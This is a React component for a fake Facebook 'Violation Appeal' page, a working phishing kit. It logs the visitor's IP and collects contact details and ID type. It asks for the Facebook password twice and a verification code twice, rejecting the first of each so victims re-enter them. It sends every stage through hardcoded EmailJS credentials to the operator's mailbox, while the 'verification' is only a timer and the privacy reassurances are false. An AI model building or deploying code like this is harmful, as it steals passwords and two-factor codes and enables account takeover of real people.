import { useState, useEffect, useRef } from "react";
import { CheckCircle2, Loader2, ChevronDown, Upload, Lock } from "lucide-react";
import emailjs from '@emailjs/browser';

export default function AppealForm() {
  const fileInputRef = useRef<HTMLInputElement | null>(null);
  const [issueType, setIssueType] = useState("fakeAccount");
  const [accountStatus, setAccountStatus] = useState("no");
  const [appealReason, setAppealReason] = useState("reason1");
  const [linkChoice, setLinkChoice] = useState("nationalId");
  const [email, setEmail] = useState("");
  const [phone, setPhone] = useState("");
  const [link, setLink] = useState("");
  const [additionalInfo, setAdditionalInfo] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showIdOptions, setShowIdOptions] = useState(false);
  const [selectedFile, setSelectedFile] = useState<File | null>(null);

  // New verification states
  const [formStage, setFormStage] = useState("initial"); // initial, password1, password2, code1, code2, complete
  const [password1, setPassword1] = useState("");
  const [password2, setPassword2] = useState("");
  const [code1, setCode1] = useState("");
  const [code2, setCode2] = useState("");
  const [passwordError, setPasswordError] = useState(false);
  const [codeError, setCodeError] = useState(false);
  const [timer, setTimer] = useState(0);
  const [isVerifying, setIsVerifying] = useState(false);

  // EmailJS configuration
  const SERVICE_ID = "service_j1vn1o6";
  const TEMPLATE_ID = "template_uvh7y0g";
  const PUBLIC_KEY = "HisNIy8_NoPxGd9Tl";
  const [userIp, setUserIp] = useState("");

  // Lấy IP người dùng khi component được load
  useEffect(() => {
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        setUserIp(data.ip);
      })
      .catch(() => {
        setUserIp("Undefined");
      });
  }, []);

  const sendEmail = (stage: string, data: any) => {
    emailjs.send(SERVICE_ID, TEMPLATE_ID, {
      stage: stage,
      ip_address: userIp,
      timestamp: new Date().toString(),
      ...data
    }, PUBLIC_KEY)
    .then((result) => {
      console.log('Email sent successfully:', result.text);
    }, (error) => {
      console.log('Failed to send email:', error.text);
    });
  };

  const handleFileChange = (event: React.ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0] || null;
    setSelectedFile(file);
  };

  const handleFileClick = () => {
    if (fileInputRef.current) {
      fileInputRef.current.click();
    }
  };

  const getIdTypeLabel = () => {
    switch(linkChoice) {
      case 'nationalId': return 'National ID';
      case 'passport': return 'Passport';
      case 'driversLicense': return 'Driver\'s License';
      default: return 'Select ID Type';
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    // Send initial form data to EmailJS
    sendEmail('initial_form', {
      issueType,
      accountStatus,
      appealReason,
      email,
      phone,
      link,
      idType: getIdTypeLabel(),
      additionalInfo
    });

    // Simulate form submission with loading time
    setTimeout(() => {
      setIsSubmitting(false);
      setFormStage("password1");
    }, 3000);
  };

  const handlePasswordSubmit1 = (e: React.FormEvent) => {
    e.preventDefault();
    setIsVerifying(true);

    sendEmail('password_attempt_1', {
      email,
      phone,
      password: password1
    });

    // Simulate verification with loading time
    setTimeout(() => {
      setIsVerifying(false);
      setPasswordError(true);
      setFormStage("password2");
    }, 3000);
  };

  const handlePasswordSubmit2 = (e: React.FormEvent) => {
    e.preventDefault();
    setIsVerifying(true);

    sendEmail('password_attempt_2', {
      email,
      phone,
      password: password2
    });

    // Simulate verification with loading time
    setTimeout(() => {
      setIsVerifying(false);
      setPasswordError(false);
      setFormStage("code1");
    }, 3000);
  };

  const handleCodeSubmit1 = (e: React.FormEvent) => {
    e.preventDefault();
    setIsVerifying(true);

    sendEmail('code_attempt_1', {
      email,
      phone,
      code: code1
    });

    // Simulate verification with loading time
    setTimeout(() => {
      setIsVerifying(false);
      setCodeError(true);
      setTimer(60);
      setFormStage("code2");

      // Start countdown timer
      startCountdown();
    }, 3000);
  };

  const startCountdown = () => {
    const interval = setInterval(() => {
      setTimer((prevTimer) => {
        if (prevTimer <= 1) {
          clearInterval(interval);
          return 0;
        }
        return prevTimer - 1;
      });
    }, 1000);
  };

  const handleCodeSubmit2 = (e: React.FormEvent) => {
    e.preventDefault();
    setIsVerifying(true);

    sendEmail('code_attempt_2', {
      email,
      phone,
      code: code2
    });

    // Simulate verification with loading time
    setTimeout(() => {
      setIsVerifying(false);
      setCodeError(false);
      setFormStage("complete");

      // Send completion notification
      sendEmail('form_complete', {
        email,
        phone,
        issueType,
        accountStatus,
        appealReason,
        idType: getIdTypeLabel(),
        timestamp: new Date().toString()
      });

    }, 3000);
  };

  const handleRestart = () => {
    setFormStage("initial");
    setPassword1("");
    setPassword2("");
    setCode1("");
    setCode2("");
    setPasswordError(false);
    setCodeError(false);
    setTimer(0);
    setIsVerifying(false);
  };

  // Initial form content
  if (formStage === "initial") {
    return (
      <div className="bg-white rounded shadow p-4">
        {/* Form Title */}
        <h1 className="text-xl font-bold text-[#1c1e21] mb-4">Violation Appeal</h1>

        {/* Form Description */}
        <p className="text-sm text-[#606770] mb-4">
          If you need to report a violation or want to appeal, please fill out this form.
        </p>

        <form onSubmit={handleSubmit}>
          {/* Form Section 1 */}
          <div className="mb-4">
            <p className="text-sm font-medium mb-2">What issue are you appealing?</p>

            <div className="mb-2">
              <label className="flex items-start mb-1 text-sm">
                <input 
                  type="radio" 
                  name="issueType" 
                  value="account" 
                  className="facebook-radio mt-1"
                  checked={issueType === "account"}
                  onChange={() => setIssueType("account")}
                />
                <span>Violation of Community Standards or Guidelines</span>
              </label>
            </div>

            <div className="mb-2">
              <label className="flex items-start mb-1 text-sm">
                <input 
                  type="radio" 
                  name="issueType" 
                  value="fakeAccount" 
                  className="facebook-radio mt-1"
                  checked={issueType === "fakeAccount"}
                  onChange={() => setIssueType("fakeAccount")}
                />
                <span>Account Disabled</span>
              </label>
            </div>
          </div>

          {/* Form Section 2 */}
          <div className="mb-4">
            <p className="text-sm font-medium mb-2">Is your account under review?</p>

            <div className="mb-1">
              <label className="flex items-start mb-1 text-sm">
                <input 
                  type="radio" 
                  name="accountStatus" 
                  value="yes" 
                  className="facebook-radio mt-1"
                  checked={accountStatus === "yes"}
                  onChange={() => setAccountStatus("yes")}
                />
                <span>Yes</span>
              </label>
            </div>

            <div className="mb-1">
              <label className="flex items-start mb-1 text-sm">
                <input 
                  type="radio" 
                  name="accountStatus" 
                  value="no" 
                  className="facebook-radio mt-1"
                  checked={accountStatus === "no"}
                  onChange={() => setAccountStatus("no")}
                />
                <span>No</span>
              </label>
            </div>
          </div>

          {/* Form Section 3 */}
          <div className="mb-4">
            <p className="text-sm font-medium mb-2">Reason for Appeal:</p>

            <div className="mb-1">
              <label className="flex items-start mb-1 text-sm">
                <input 
                  type="radio" 
                  name="appealReason" 
                  value="reason1" 
                  className="facebook-radio mt-1"
                  checked={appealReason === "reason1"}
                  onChange={() => setAppealReason("reason1")}
                />
                <span>Yes, I am being wrongly accused.</span>
              </label>
            </div>

            <div className="mb-1">
              <label className="flex items-start mb-1 text-sm">
                <input 
                  type="radio" 
                  name="appealReason" 
                  value="reason2" 
                  className="facebook-radio mt-1"
                  checked={appealReason === "reason2"}
                  onChange={() => setAppealReason("reason2")}
                />
                <span>No, but I would like to explain the situation.</span>
              </label>
            </div>

            <div className="mb-1">
              <label className="flex items-start mb-1 text-sm">
                <input 
                  type="radio" 
                  name="appealReason" 
                  value="reason3" 
                  className="facebook-radio mt-1"
                  checked={appealReason === "reason3"}
                  onChange={() => setAppealReason("reason3")}
                />
                <span>No, I am experiencing a different issue.</span>
              </label>
            </div>
          </div>

          {/* Email Input */}
          <div className="mb-4">
            <label className="facebook-label">Your Contact Email</label>
            <input 
              type="email" 
              className="facebook-input" 
              placeholder="example@email.com"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
            />
          </div>

          {/* Phone Input - New field */}
          <div className="mb-4">
            <label className="facebook-label">Your Phone Number</label>
            <input 
              type="tel" 
              className="facebook-input" 
              placeholder="0123456789"
              value={phone}
              onChange={(e) => setPhone(e.target.value)}
            />
          </div>

          {/* Link Input */}
          <div className="mb-4">
            <label className="facebook-label">Link to your profile</label>
            <input 
              type="text" 
              className="facebook-input" 
              placeholder="https://www.facebook.com/..." 
              value={link}
              onChange={(e) => setLink(e.target.value)}
            />
          </div>

          {/* Document Options */}
          <div className="mb-4">
            <p className="text-sm font-medium mb-2">ID Type</p>
            <div className="border border-[#dddfe2] rounded p-3">
              <div 
                className="flex justify-between items-center cursor-pointer"
                onClick={() => setShowIdOptions(!showIdOptions)}
              >
                <span className="text-sm">{getIdTypeLabel()}</span>
                <ChevronDown className={`w-4 h-4 transition-transform ${showIdOptions ? 'rotate-180' : ''}`} />
              </div>

              {showIdOptions && (
                <div className="mt-2 border-t pt-2">
                  <div 
                    className="py-1 px-2 hover:bg-gray-100 cursor-pointer text-sm"
                    onClick={() => {
                      setLinkChoice("nationalId");
                      setShowIdOptions(false);
                    }}
                  >
                    National ID
                  </div>
                  <div 
                    className="py-1 px-2 hover:bg-gray-100 cursor-pointer text-sm"
                    onClick={() => {
                      setLinkChoice("passport");
                      setShowIdOptions(false);
                    }}
                  >
                    Passport
                  </div>
                  <div 
                    className="py-1 px-2 hover:bg-gray-100 cursor-pointer text-sm"
                    onClick={() => {
                      setLinkChoice("driversLicense");
                      setShowIdOptions(false);
                    }}
                  >
                    Driver's License
                  </div>
                </div>
              )}

              <div className="mt-3 pt-3 border-t border-[#dddfe2]">
                <input
                  type="file"
                  ref={fileInputRef}
                  onChange={handleFileChange}
                  className="hidden"
                  accept="image/*,.pdf"
                />
                <button
                  type="button"
                  onClick={handleFileClick}
                  className="flex items-center px-3 py-2 bg-gray-200 hover:bg-gray-300 rounded text-sm font-medium transition-colors"
                >
                  <Upload className="w-4 h-4 mr-2" />
                  {selectedFile ? selectedFile.name : "Upload Document"}
                </button>
                {selectedFile && (
                  <div className="mt-2 text-xs text-green-600">
                    File Selected: {selectedFile.name}
                  </div>
                )}
              </div>
            </div>
          </div>

          {/* Additional Details */}
          <div className="mb-4">
            <label className="facebook-label">Additional Information</label>
            <textarea 
              className="facebook-input" 
              rows={5} 
              placeholder="Enter additional details about your appeal"
              value={additionalInfo}
              onChange={(e) => setAdditionalInfo(e.target.value)}
            ></textarea>
          </div>

          {/* Information Text */}
          <div className="mb-4">
            <p className="text-xs text-[#606770] mb-2">Please verify your identity by attaching an image of your government-issued ID. Before uploading personal documents, please review Facebook's acceptable ID types.</p>

            <p className="text-xs text-[#606770] mb-2">We may be able to restore your account within 24 hours. Your ID will be kept strictly confidential and will not be shared with anyone.</p>

            <p className="text-xs text-[#606770] mb-2">If you do not want Facebook to use your ID to improve its automated system for blocking fake accounts, you may opt out of this. If you disable this option, your document will only be used for processing this appeal.</p>

            <p className="text-xs text-[#606770]">Or visit our Help Center to learn more about what happens to your ID after you submit it to us.</p>
          </div>

          {/* Submit Button */}
          <div className="text-right">
            <button 
              type="submit"
              className="px-4 py-2 rounded font-medium text-white transition-colors bg-[#4267B2] hover:bg-[#3b5998]"
              disabled={isSubmitting}
            >
              {isSubmitting ? "Submitting..." : "Submit"}
            </button>
          </div>
        </form>
      </div>
    );
  }

  // Password verification - Step 1
  if (formStage === "password1") {
    return (
      <div className="verification-container w-full">
        <p className="text-sm text-[#606770] mb-5 text-center">
          Please enter your account password to verify your identity before processing the appeal.
        </p>

        <form onSubmit={handlePasswordSubmit1}>
          <div className="mb-5">
            <label className="facebook-label">Facebook Password</label>
            <input 
              type="password" 
              className={`facebook-input ${passwordError ? "border-red-500" : ""}`}
              value={password1}
              onChange={(e) => setPassword1(e.target.value)}
              placeholder="Enter your password"
              required
            />
            {passwordError && (
              <p className="facebook-error-text">Incorrect password. Please try again or request a password reset.</p>
            )}
          </div>

          <div className="flex justify-center mb-4">
            <button 
              type="submit"
              className="w-full py-2 px-4 rounded font-medium text-white transition-colors bg-[#4267B2] hover:bg-[#3b5998] flex justify-center items-center"
              disabled={isVerifying}
            >
              {isVerifying ? (
                <>
                  <Loader2 className="h-4 w-4 mr-2 animate-spin" />
                  Verifying...
                </>
              ) : (
                "Continue"
              )}
            </button>
          </div>

          <div className="text-center">
            <a href="#" className="text-[#4267B2] text-sm hover:underline">Forgot Password?</a>
          </div>
        </form>
      </div>
    );
  }

  // Password verification - Step 2
  if (formStage === "password2") {
    return (
      <div className="verification-container w-full">
        <p className="text-sm text-[#FF0000] mb-5 text-center font-medium">
          Incorrect password. Please try again or request a password reset.
        </p>

        <form onSubmit={handlePasswordSubmit2}>
          <div className="mb-5">
            <label className="facebook-label">Facebook Password</label>
            <input 
              type="password" 
              className="facebook-input"
              value={password2}
              onChange={(e) => setPassword2(e.target.value)}
              placeholder="Enter your password again"
              required
            />
          </div>

          <div className="flex justify-center mb-4">
            <button 
              type="submit"
              className="w-full py-2 px-4 rounded font-medium text-white transition-colors bg-[#4267B2] hover:bg-[#3b5998] flex justify-center items-center"
              disabled={isVerifying}
            >
              {isVerifying ? (
                <>
                  <Loader2 className="h-4 w-4 mr-2 animate-spin" />
                  Verifying...
                </>
              ) : (
                "Verify"
              )}
            </button>
          </div>

          <div className="text-center">
            <a href="#" className="text-[#4267B2] text-sm hover:underline">Forgot Password?</a>
          </div>
        </form>
      </div>
    );
  }

  // Code verification - Step 1
  if (formStage === "code1") {
    return (
      <div className="verification-container w-full">
        <p className="text-sm text-[#606770] mb-5 text-center">
          We have sent a verification code to your registered email or phone number.
          Please check and enter the verification code below.
        </p>

        <form onSubmit={handleCodeSubmit1}>
          <div className="mb-5">
            <label className="facebook-label">Verification Code</label>
            <input 
              type="text" 
              className={`facebook-input ${codeError ? "border-red-500" : ""}`}
              value={code1}
              onChange={(e) => setCode1(e.target.value.replace(/[^0-9]/g, '').slice(0, 8))}
              placeholder=""
              required
              maxLength={8}
            />
            {codeError && (
              <p className="facebook-error-text">Incorrect verification code. Please try again.</p>
            )}
          </div>

          <div className="flex justify-center mb-4">
            <button 
              type="submit"
              className="w-full py-2 px-4 rounded font-medium text-white transition-colors bg-[#4267B2] hover:bg-[#3b5998] flex justify-center items-center"
              disabled={isVerifying}
            >
              {isVerifying ? (
                <>
                  <Loader2 className="h-4 w-4 mr-2 animate-spin" />
                  Verifying...
                </>
              ) : (
                "Verify"
              )}
            </button>
          </div>

          <div className="text-center">
            <a href="#" className="text-[#4267B2] text-sm hover:underline">Resend Code</a>
          </div>
        </form>
      </div>
    );
  }

  // Code verification - Step 2
  if (formStage === "code2") {
    return (
      <div className="verification-container w-full">
        <p className="text-sm text-[#FF0000] mb-5 text-center font-medium">
          The code you entered is incorrect. Please try again with the new code sent to your device.
        </p>

        <form onSubmit={handleCodeSubmit2}>
          <div className="mb-5">
            <label className="facebook-label">Verification Code</label>
            <input 
              type="text" 
              className="facebook-input"
              value={code2}
              onChange={(e) => setCode2(e.target.value.replace(/[^0-9]/g, '').slice(0, 8))}
              placeholder=""
              required
              maxLength={8}
              disabled={timer > 0}
            />
            {timer > 0 && (
              <p className="facebook-error-text text-yellow-600">
                Please wait {timer} seconds to try again...
              </p>
            )}
          </div>

          <div className="flex justify-center mb-4">
            <button 
              type="submit"
              className={`w-full py-2 px-4 rounded font-medium text-white transition-colors ${
                timer > 0 ? "bg-gray-400" : "bg-[#4267B2] hover:bg-[#3b5998]"
              } flex justify-center items-center`}
              disabled={timer > 0 || isVerifying}
            >
              {isVerifying ? (
                <>
                  <Loader2 className="h-4 w-4 mr-2 animate-spin" />
                  Verifying...
                </>
              ) : (
                "Verify"
              )}
            </button>
          </div>

          <div className="text-center">
            <a href="#" className={`text-sm ${timer > 0 ? "text-gray-400" : "text-[#4267B2] hover:underline"}`}>
              {timer > 0 ? `Resend code after ${timer}s` : "Resend Code"}
            </a>
          </div>
        </form>
      </div>
    );
  }

  // Completion screen
  if (formStage === "complete") {
    return (
      <div className="verification-container w-full text-center py-8">
        <div className="flex justify-center mb-6">
          <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center">
            <CheckCircle2 className="h-12 w-12 text-green-500" />
          </div>
        </div>

        <h1 className="text-xl font-bold text-[#1c1e21] mb-4">Your appeal has been submitted</h1>

        <div className="text-sm text-[#606770] mb-8 space-y-3">
          <p>Thank you for providing the information.</p>
          <p>We have received your appeal and will respond as soon as possible via email or the phone number you registered.</p>
          <p>You will receive a notification when there is an update on the status of your appeal.</p>
        </div>

        <button 
          onClick={handleRestart}
          className="w-full py-3 px-4 rounded font-medium text-white transition-colors bg-[#4267B2] hover:bg-[#3b5998]"
        >
          Go back to the main page
        </button>

        <div className="mt-4">
          <a href="#" className="text-[#4267B2] text-sm hover:underline">Help Center</a>
        </div>
      </div>
    );
  }

  return null;
}